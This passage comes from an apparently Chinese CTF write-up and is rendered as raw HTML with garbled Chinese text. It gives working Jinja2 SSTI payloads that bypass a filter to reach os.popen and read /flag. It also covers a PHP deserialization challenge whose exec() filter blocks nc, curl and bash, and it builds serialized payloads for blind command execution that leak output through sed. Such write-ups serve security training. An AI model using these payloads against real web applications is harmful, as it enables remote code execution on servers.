&lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;charset_normalizer.md.MessDetectorPlugin&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatch&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatches&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CliDetectionResult&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;requests.cookies.MockRequest&#x27;&gt;, &lt;class &#x27;requests.cookies.MockResponse&#x27;&gt;, &lt;class &#x27;requests.auth.AuthBase&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;requests.models.RequestEncodingMixin&#x27;&gt;, &lt;class &#x27;requests.models.RequestHooksMixin&#x27;&gt;, &lt;class &#x27;requests.models.Response&#x27;&gt;, &lt;class &#x27;requests.adapters.BaseAdapter&#x27;&gt;, &lt;class &#x27;requests.sessions.SessionRedirectMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.structures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;configparser.Interpolation&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.trsock.TransportSocket&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class &#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.DebugTraceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;] &quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br>count = <span class="hljs-number">0</span><br>tem = <span class="hljs-string">&#x27;os._wrap_close&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[i])<br>    <span class="hljs-keyword">if</span> tem <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        <span class="hljs-built_in">print</span>(count)<br>        <span class="hljs-keyword">break</span><br>    count = count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132])%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010163213824.png" srcset="/img/loading.gif" lazyload alt="image-20231010163213824"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½¿ç”¨&quot;~&quot;è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼š<br>secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;])%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010161929907.png" srcset="/img/loading.gif" lazyload alt="image-20231010161929907"></p>
<p>paylaod:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;])%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010162204147.png" srcset="/img/loading.gif" lazyload alt="image-20231010162204147"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;ls /&quot;).read())%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010162348128.png" srcset="/img/loading.gif" lazyload alt="image-20231010162348128"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;tac /flag&quot;).read())%&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231010162449022.png" srcset="/img/loading.gif" lazyload alt="image-20231010162449022"></p>
<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>ä»£ç å®¡è®¡:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-comment">//æœ‰ç±»çš„è¾“å‡ºä¼šè¿›è¡Œæ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿‡æ»¤äº†:$ . ! @ # % ^ &amp; * ? &#123; &#125; &gt; &lt;</span><br>        <span class="hljs-comment">//nc tee wget exec bash sh netcat grep base64 rev curl </span><br>        <span class="hljs-comment">//wget gcc php python pingtouch mv mkdir cp</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-comment">//æ— å›æ˜¾rce</span><br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å¯ç”¨äºæ‰§è¡Œ__toString()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;qwejaskdjnlka = new minipop();</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/125859628?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-2-125859628-blog-123039067.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=5">rceï¼ˆæ— å›æ˜¾ï¼‰_æ— å›æ˜¾rce_å¶å°”èº²èº²ä¹Œäº‘334çš„åšå®¢-CSDNåšå®¢</a></p>
<p>æµ‹è¯•å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œ:</p>
<p>æ„é€ rceè„šæœ¬:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">// $payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;</span><br><span class="hljs-comment">// $obj-&gt;code = $payload;</span><br><span class="hljs-variable">$obj</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code=&#x27;ls|sleep 5&#x27;;//ä¼šä½¿ç½‘é¡µå»¶è¿Ÿ5ç§’<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>å‘ç°ç½‘é¡µå»¶è¿Ÿå›æ˜¾ï¼Œè¯´æ˜æˆ‘ä»¬ä¸Šä¼ çš„payloadå‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œ</p>
<p><strong>sedç®¡é“å‘½ä»¤æ‰§è¡Œ:</strong></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;<br>å°†|ä¹‹å‰å‘½ä»¤æ‰§è¡Œçš„ç»“æœçš„1-20è¡Œå†…å®¹å†™å…¥testæ–‡ä»¶ä¸­ï¼Œtest&lt;=&gt;./test,æ‰€ä»¥testæ–‡ä»¶å­˜åœ¨äºå½“å‰ç½‘é¡µçš„æ–‡ä»¶å¤¹ä¸­<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code = &quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;<br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231031192813120.png" srcset="/img/loading.gif" lazyload alt="image-20231031192813120"></p>
<p>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231013111032145.png" srcset="/img/loading.gif" lazyload alt="image-20231013111032145"></p>
